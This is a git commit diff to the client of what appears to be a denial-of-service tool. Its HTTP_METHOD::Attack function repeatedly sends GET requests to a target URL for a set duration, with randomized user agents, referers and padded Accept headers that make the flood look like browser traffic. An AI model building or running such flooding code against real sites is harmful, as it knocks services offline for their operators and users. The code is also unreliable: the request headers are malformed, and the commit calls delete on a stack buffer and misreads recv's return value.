35332a1cee3c96f92001dfbe45580e5f828f2dc9
TroII46 <73843603+TroII46@users.noreply.github.com>
2023-07-11 16:36:33 +0200

    Added accepts and print, response buffer delete (avoid memory leak) and print when connection time out

--- client/src/private/HTTPClient.cpp
+++ client/src/private/HTTPClient.cpp
@@ -34,16 +34,34 @@ void HTTPClient::GET(std::string url, ADDR_TYPE type) {
 	srand(time(nullptr));
 	std::string user_agent = user_agents[rand() % ((sizeof(user_agents) / sizeof(std::string)) - 1)];
 	std::string referer = referers[rand() % ((sizeof(referers) / sizeof(std::string)) - 1)];
-	std::string httpGet = 
-		"GET / HTTP/1.1\r\n: "					
+	std::string httpGet =
+		"GET / HTTP/1.1\r\n: "
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+		"Accept-Encoding: gzip, deflate\r\n"
+		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n"
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n"
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n"
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n"
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+		"Accept: text/html, application/xhtml+xml"
+		"Accept-Language: en-US,en;q=0.5\r\n"
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n"
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
+		"Referer: " + referer + "\r\n\r\n"
 		"Host: " + url + "\r\n"
-		"User-Agent: " + user_agent + "\r\n"
-		"Referer: " + referer + "\r\n\r\n";
+		"User-Agent: " + user_agent + "\r\n";
+		
 
 	send(sock, httpGet.data(), httpGet.size(), 0);
 
 	char respBuff[1024];
-	recv(sock, respBuff, sizeof(respBuff), NULL);
-
+	if (recv(sock, respBuff, sizeof(respBuff), NULL) == WSAETIMEDOUT)
+		printf("socket timed out\n");
+	
+	delete respBuff;
 	closesocket(sock);
 }
--- client/src/private/Methods/HTTP.cpp
+++ client/src/private/Methods/HTTP.cpp
@@ -3,13 +3,11 @@
 void HTTP_METHOD::Attack(std::string url, int nDuration) {
 	HTTPClient http { false };
 	time_t start_time = time(nullptr);
-
+	float elapsed_time = 0.f;
 	/* Attack to the specified URL during the specified time. */
-	while (true) {
+	while (elapsed_time < nDuration) {
 		time_t end_time = time(nullptr);
-		float elapsed_time = (float)end_time - (float)start_time;
-		if (elapsed_time >= nDuration)
-			break;
+		elapsed_time = (float)end_time - (float)start_time;
 		
 		http.GET(url, ADDR_TYPE::IPv4);
 	}
